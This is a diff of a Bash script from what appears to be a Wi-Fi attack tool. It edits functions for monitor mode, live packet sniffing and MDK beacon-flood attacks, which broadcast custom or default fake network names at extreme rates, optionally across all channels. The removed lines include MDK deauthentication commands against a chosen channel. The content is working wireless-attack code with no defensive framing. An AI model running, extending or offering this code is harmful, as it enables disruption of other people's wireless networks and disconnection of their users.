@@ -541,7 +541,7 @@ InterMsg3
 #### Beacon flood monitor mode #### 
 
 MonitorMode3(){
-       $Tool -e $AirMonitor start $Interface >> /dev/null && $Tool -e $AirDumper $wifiInterfaceMon
+       $Tool -e $AirMonitor start $Interface >> /dev/null & $Tool -e $AirDumper $wifiInterfaceMon
 }
 
 #### Monitor mode 3 options ####
@@ -549,7 +549,7 @@ MonitorMode3(){
 Yes(){
 echo ""
 echo "You take the Yes option starting sniffing services"        
-sleep 1,2
+sleep 2
 MonitorMode3
 }
 
@@ -557,7 +557,7 @@ No(){
 echo ""
 $AirMonitor start $Interface >> /dev/null
 echo "You take the No option starting Beacon flooding menu"        
-sleep 1,5
+sleep 2
 
 
 }
@@ -565,7 +565,7 @@ sleep 1,5
 #### Realtime attack sniffing packets####
 
 Realtimer(){
-$Tool -title Real_time_attack_stream -fg green -e $sniffer -i $wifiInterfaceMon 
+$Tool -fg green -e $sniffer -i $wifiInterfaceMon 
 }
 
 #### Monitor mode 3 actions ####
@@ -598,24 +598,16 @@ WifiSpy_Choose
 #### Personalitzed and default beacon flood attack options ####
 
 yes(){
-        echo ""
-        echo "making file"
-             touch names >> /dev/null
-                echo "Write the names that you want on file"
-                echo "When you finish to write the names push ctrl+s to save and after ctrl+x to exit"
-                echo ""
-                sleep 3,6
-                nano names
+
+bash ./beaconPers.sh
 
         if echo "starting personalized beacon flood attack"
         then 
         echo "starting stream attack"
         Realtimer &
-        sleep 1,2 & 
-        $MDK $wifiInterfaceMon d -c $ch &
-        x-terminal-emulator -e $MDK $wifiInterfaceMon b -f names
+        sleep 1 & 
+        $Tool -e $MDK $wifiInterfaceMon b -f names -s 9000000000000000000
 fi
-
 }
 
 
@@ -623,15 +615,15 @@ no(){
       echo ""
       if echo "starting stream attack"
          echo ""
-        echo "starting default attack"
+  then   echo "starting default attack"
         Realtimer &
-        then $MDK $wifiInterfaceMon d -c $ch & 
-        x-terminal-emulator -e $MDK $wifiInterfaceMon b -a -s 9000000000000000000
+        x-terminal-emulator -e $MDK $wifiInterfaceMon b -s 9000000000000000000
  fi
   
 }
 
 Choose(){
+echo
 echo "You want to do a personalized attack ???" 
 read -p " Press 1 for Yes  2 for No $ " get
 Election
@@ -668,7 +660,7 @@ echo ""
         option
 
 
-        echo "What channel of 1-13 you want to attack ???"
+        echo "What channel of 1-13 you want to attack ??? ("For attack all channels leave in blank and enter...")"
         echo ""
      
        read -p "└─────►$(tput setaf 7) " ch
